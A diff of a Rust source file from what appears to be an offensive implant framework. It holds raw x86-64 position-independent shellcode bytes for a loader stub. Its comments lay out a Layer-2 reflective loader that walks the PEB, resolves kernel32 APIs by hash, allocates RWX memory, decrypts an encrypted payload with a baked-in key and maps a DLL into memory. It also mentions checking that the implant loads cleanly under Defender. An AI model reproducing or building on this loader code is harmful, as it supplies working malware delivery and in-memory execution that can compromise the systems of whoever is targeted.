@@ -1,26 +1,27 @@
 //! Raw x86-64 PIC loader stub shellcode (Layer 1), plus the host-side
-//! reflective PE loader used to verify and exercise the mapping logic. The
-//! on-target "Layer 2" decrypt + reflective load sequence is intentionally
-//! out of scope for this host-side crate (it needs Windows-VM iterative
-//! debugging that can't be done over SSH-to-VPS); loading verification on the
-//! engagement box is done host-side via [`crate::dll_probe`] instead —
-//! `LoadLibraryW` the built implant DLL and enumerate its `nyx_selftest_*`
-//! exports.
+//! reflective PE loader used to verify and exercise the mapping logic.
+//!
+//! The on-target "Layer 2" decrypt + reflective load sequence is now
+//! implemented — see [`crate::on_target`] for the Layer-2 PIC shellcode
+//! (PEB walk, RWX alloc, inline ChaCha20-Poly1305 decrypt, reflective PE
+//! map, `DllMain` call) and [`crate::generate_loader_stub`] for the emitter
+//! that stitches Layer 1 + the per-config key + Layer 2 into the final blob.
+//! Loading verification on the engagement box is *additionally* done
+//! host-side via [`crate::dll_probe`] — `LoadLibraryW` the built implant DLL
+//! and enumerate its `nyx_selftest_*` exports — which remains as a
+//! host-side sanity check alongside the live loader-probe gate.
 //!
 //! This file holds three related but distinct things:
 //!
 //! 1. **`PIC_STUB`** — a host-side constant of position-independent x86-64
-//!    bytes emitted into every generated payload by
-//!    [`crate::generate_loader_stub`]. It does NOT run on the build host; it
-//!    is the shellcode entry point of the reflective loader blob on the target.
-//!    The stub self-locates via `call/pop`, then walks forward past its own
-//!    code to find the `NYX2` magic marker and parse the encrypted-payload
-//!    header, then loads the payload-pointer trampoline registers and falls
-//!    into the reserved on-target trampoline region (offset `0x18`+) where the
-//!    decrypt + reflective-load shellcode lives (the on-target decrypt + PE
-//!    map sequence is intentionally out of scope for this host-side crate —
-//!    see the note at the bottom of this file; loading is verified host-side
-//!    via `crate::dll_probe` instead).
+//!    bytes representing the **historical** Layer-1-only stub (self-locate,
+//!    NYX2 scan, header parse, trampoline-register ABI). It is retained as a
+//!    byte-stable reference of the original 50-byte Layer-1 design and is
+//!    unit-tested below. The **production** stub emitted by
+//!    [`crate::generate_loader_stub`] is now the Layer-1 + key + Layer-2
+//!    sequence in [`crate::on_target`]; `PIC_STUB` is no longer placed into
+//!    generated payloads but documents the self-location + scan + header-parse
+//!    contract that the production Layer-1 prefix implements.
 //!
 //! 2. **`reflective_load`** — a host-side (std) function that performs the
 //!    full reflective PE loading *algorithm* — manual section mapping, base
@@ -41,16 +42,27 @@
 //! ## Payload layout (what the stub sees in memory)
 //!
 //! ```text
-//! [PIC_STUB (50 bytes)][NYX2 magic (4B)][encrypted_len LE (4B)][nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)]
+//! [loader stub (variable, Layer 1 + key + Layer 2)][NYX2 magic (4B)][encrypted_len LE (4B)][nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)]
 //! ```
 //!
 //! The stub is at offset 0 (entry point). It self-locates via `call/pop`, then
 //! walks **forward** past its own code to find the `NYX2` magic marker. Once
 //! found it reads `encrypted_len` (u32 LE) from `[magic+4]`, the 12-byte nonce
-//! from `[magic+8]`, and the `ciphertext || tag` at `[magic+20]`. The trailing
-//! bytes are reserved for the on-target decrypt-and-load trampoline.
+//! from `[magic+8]`, and the `ciphertext || tag` at `[magic+20]`. Layer 2 then
+//! decrypts (inline ChaCha20-Poly1305 with the key baked into the stub) and
+//! reflectively loads the resulting PE32+ image.
 
-/// The PIC stub shellcode — 50 bytes of position-independent x86-64.
+/// The historical PIC stub shellcode — 50 bytes of position-independent
+/// x86-64 representing the original Layer-1-only design.
+///
+/// **This constant is no longer placed into generated payloads.** The
+/// production stub emitted by [`crate::generate_loader_stub`] is the Layer-1
+/// prefix in [`crate::on_target::LAYER1_BOOTSTRAP`] followed by the per-config
+/// 32-byte key and the Layer-2 decrypt-and-reflect shellcode in
+/// [`crate::on_target::LAYER2_PEB_WALK`]. `PIC_STUB` is retained here as a
+/// byte-stable reference of the self-location + scan + header-parse contract
+/// (its byte-level tests pin that contract) and as documentation of the
+/// trampoline-register ABI that Layer 1 hands off to Layer 2.
 ///
 /// ## Disassembly
 ///
@@ -89,20 +101,21 @@
 /// ; trampoline bytes at 0x2A+ with the real decrypt+reflect entry.
 /// 0028: EB 00             jmp    $+2             ; → 0x2A (trampoline entry)
 ///
-/// ; ── LAYER 2: reserved trampoline slot (8 bytes, NOP on host) ─────────
-/// ; The on-target build patches this 8-byte slot with a 5-byte `jmp rel32`
-/// ; to the real decrypt+reflect trampoline (which lives in a separate region
-/// ; of the payload — 8 bytes is not enough for the loader itself). The full
+/// ; ── LAYER 2: reserved trampoline slot (8 bytes, NOP in this reference) ─
+/// ; In the historical Layer-1-only design this 8-byte slot was a NOP placeholder
+/// ; that the on-target build would patch with a 5-byte `jmp rel32` to the real
+/// ; decrypt+reflect trampoline. The production stub now carries the full
+/// ; Layer-2 sequence inline (see `crate::on_target::LAYER2_PEB_WALK`); the
 /// ; loader algorithm is:
 /// ;   1. ChaCha20-Poly1305 decrypt(rcx=&nonce, rdx=&ciphertext, rax=enc_len)
 /// ;      → produces a plaintext PE32+ in a fresh RW page
 /// ;   2. peb_walk::peb_pointer() → (*peb).ldr → InLoadOrderModuleList
-/// ;   3. find ntdll + kernel32 by djb2 hash, parse EAT, resolve
-/// ;      NtAllocateVirtualMemory / LoadLibraryA / GetProcAddress
+/// ;   3. find kernel32 by djb2 hash, parse EAT, resolve
+/// ;      VirtualAlloc / LoadLibraryA / GetProcAddress
 /// ;   4. reflective_load algorithm: map sections, apply DIR64 relocs,
 /// ;      resolve IAT, then call DllMain(base, DLL_PROCESS_ATTACH, null)
-/// ; See the note at the bottom of this file for why the on-target loader is
-/// ; out of scope (loading is verified host-side via `crate::dll_probe`).
+/// ; This historical slot is retained in `PIC_STUB` purely as a byte-stable
+/// ; reference; production blobs use the Layer-1 + key + Layer-2 layout.
 /// 002A: 90 90 90 90 90 90 90 90
 /// ```
 ///
@@ -136,11 +149,12 @@ pub const PIC_STUB: &[u8] = &[
     // mov r8, imm64  (NYX_DIAG_LOADER_REACHED: in-memory bytes spell "NYXLDR1\0")
     0x49, 0xB8, 0x4E, 0x59, 0x58, 0x4C, 0x44, 0x52, 0x31, 0x00, 0xEB,
     0x00, // jmp +0 → trampoline entry (offset 0x2A)
-    // ── LAYER 2: reserved trampoline slot (8 bytes, NOP on host) ────────
-    // 8 bytes is too small for a real decrypt+reflect loader, but it fits a
-    // 5-byte `jmp rel32` that the on-target build patches in to jump to the
-    // real trampoline region elsewhere in the payload. See the note at the
-    // bottom of this file — the on-target loader is intentionally out of scope.
+    // ── LAYER 2: reserved trampoline slot (8 bytes, NOP in this reference)
+    // Historical Layer-1-only placeholder: 8 bytes is too small for a real
+    // decrypt+reflect loader, so it fit only a 5-byte `jmp rel32` to a real
+    // trampoline elsewhere in the payload. The production stub now carries
+    // the full Layer-2 sequence inline (see `crate::on_target::LAYER2_PEB_WALK`);
+    // this slot is retained in `PIC_STUB` only as a byte-stable reference.
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
 ];
 
@@ -556,32 +570,30 @@ fn resolve_imports(
 }
 
 // ===========================================================================
-// On-target reflective load — intentionally NOT implemented in this crate
+// On-target reflective load — implemented in `crate::on_target`
 // ===========================================================================
 //
 // The full on-target decrypt + PE-map + reloc + IAT + DllMain sequence (the
 // "Layer 2" reflective loader that runs as PIC shellcode on the engagement
-// target) is deliberately out of scope for this host-side crate. A correct,
-// non-footgun implementation requires ~500 lines of `unsafe` PIC assembly
-// plus iterative WinDbg debugging on a real Windows host — SSH-to-VPS cannot
-// validate it. The honest split is:
+// target) lives in [`crate::on_target`]. That module holds:
 //
-//   * Layer 1 — the PIC stub here (`PIC_STUB`) locates the NYX2 header and
-//     populates the trampoline-register ABI. It is byte-stable and unit-tested.
-//   * Host-side reference loader — `reflective_load_at` (above) implements the
-//     full mapping algorithm (sections / relocs / IAT) and is unit-tested with
-//     a synthetic PE32+ fixture. Any future on-target port can lift the
-//     algorithm verbatim.
-//   * PEB-walk algorithm — `crate::peb_walk` models PEB → LDR → EAT resolution
-//     with pinned-offset unit tests; the live implant's resolve.rs is the
-//     production version.
+//   * `LAYER1_BOOTSTRAP` — the production Layer-1 prefix (self-locate, NYX2
+//     scan, header parse, PEB-walk hand-off). It replaces the historical
+//     `PIC_STUB` retained above as a byte-stable reference.
+//   * `LAYER2_PEB_WALK` — the Layer-2 PIC shellcode: PEB walk to resolve
+//     `kernel32!{VirtualAlloc,LoadLibraryA,GetProcAddress}` by djb2 hash,
+//     RWX allocation, inline ChaCha20-Poly1305 decrypt (key baked into the
+//     stub at `KEY_PATCH_OFFSET`, nonce read from the NYX2 header), reflective
+//     PE map (sections + DIR64 relocs + IAT), then
+//     `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
+//   * `find_magic_offset` — the pure host-side model of the Layer-1 scan loop,
+//     extracted for unit testing without a Windows target.
 //
-// Instead of an on-target shellcode path that cannot be validated on the
-// engagement box, loading verification is done host-side via
-// [`crate::dll_probe`] — a std tool that `LoadLibrary`s the built implant DLL
-// and enumerates its `nyx_selftest_*` exports. That answers the real question
-// ("does the DLL load cleanly under Defender, and what selftests does it
-// export?") with a tool that actually runs on the Windows target.
+// Layer 1 + the per-config 32-byte key + Layer 2 are stitched into the final
+// blob by [`crate::generate_loader_stub`]; the host-side reference loader
+// `reflective_load_at` above remains the testable algorithm reference. The
+// host-side [`crate::dll_probe`] is retained as a host-side sanity check
+// alongside the live VPS loader-probe gate (spec §5.5).
 
 #[cfg(test)]
 mod tests {
